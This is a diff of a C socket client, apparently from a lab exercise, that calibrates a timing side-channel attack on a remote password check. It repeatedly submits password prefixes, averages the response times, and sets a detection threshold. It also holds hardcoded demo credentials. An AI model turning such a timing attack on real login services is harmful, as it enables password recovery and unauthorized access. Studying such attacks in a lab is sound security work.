@@ -1,6 +1,3 @@
-// Client side C/C++ program to demonstrate Socket programming
-// Reference: https://www.geeksforgeeks.org/socket-programming-cc/
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/socket.h>
@@ -19,14 +16,14 @@
 #define shan_ip "192.168.1.46"
 #define shan_linux_ip "128.252.167.161"
 #define shan_lab_ip "192.168.122.1"
-char* ip = shan_lab_ip; //change this to your ip
+char* ip = shan_lab_ip; //change this to your Linux lab IP address
 
-//username and password of the hacker
+//known username and password of the hacker
 char* USERNAME = "shan";
 char* PASSWORD = "shannon_password_super_secret";
 
-#define NUM_ITERS 500
-#define BUFFER_PERCENT 0.9 //lowers threshold a bit to make hack a little easier
+#define NUM_ITERS 1000
+#define BUFFER_PERCENT 0.8 //lowers threshold a bit to make hack a little faster
 
 struct timespec req_before, req_after;
 const int max_expected_args = 2;
@@ -110,21 +107,20 @@ int main(int argc, char const* argv[]) {
     for (int i = 0; i < NUM_TESTS; i++) {
         //copy first i+1 characters into guess, then insert incorrect character
         strncpy(guess, PASSWORD, i+1);
-        guess[i+1] = '|';
-        guess[i+2] = '\0';
+        guess[i+1] = '\0';
         printf("guessing password %s\n", guess);
         tests[i] = 0;
 
         //average NUM_ITERS test results on this guess
         for (int j = 0; j < NUM_ITERS; j++) {
             test = test_creds(USERNAME, guess, strlen(USERNAME), strlen(guess), sock);
-            printf("test = %lf\n", test);
+            //printf("test = %lf\n", test);
             
             if (test == -1) exit(EXIT_FAILURE);
-            tests[i] += test;
+            tests[i] += test / 1000;
         }
 
-        tests[i] /= NUM_ITERS;
+        tests[i] *= 1000 / NUM_ITERS;
     }
 
     //calculate threshold by taking the minimum difference in average times
@@ -132,8 +128,10 @@ int main(int argc, char const* argv[]) {
     double diff;
     for (int i = 0; i < NUM_TESTS - 1; i++) {
         diff = tests[i+1] - tests[i];
+        printf("diff is %lf - %lf = %lf\n", tests[i+1], tests[i], diff);
         if (threshold == 0 || diff < threshold) {
-          threshold = diff;
+            threshold = diff;
+            printf("threshold is now %lf\n", threshold);
         }
     }
     threshold *= BUFFER_PERCENT; //a lowered threshold makes the hack easier
